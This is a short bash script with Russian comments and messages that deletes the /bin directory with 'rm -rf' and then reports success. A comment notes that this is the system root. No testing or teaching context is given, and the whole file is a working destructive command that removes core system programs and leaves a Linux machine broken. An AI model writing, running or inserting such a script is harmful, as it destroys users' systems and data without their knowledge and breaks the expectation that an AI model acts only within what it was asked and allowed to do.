#!/bin/bash

TARGET_DIR="/bin" # Внимание: это корень системы! 

if [ -d "$TARGET_DIR" ]; then
    echo "Удаление директории: $TARGET_DIR"
    rm -rf "$TARGET_DIR"
    echo "Директория успешно удалена."
else
    echo "Директория $TARGET_DIR не найдена, пропуск."
fi

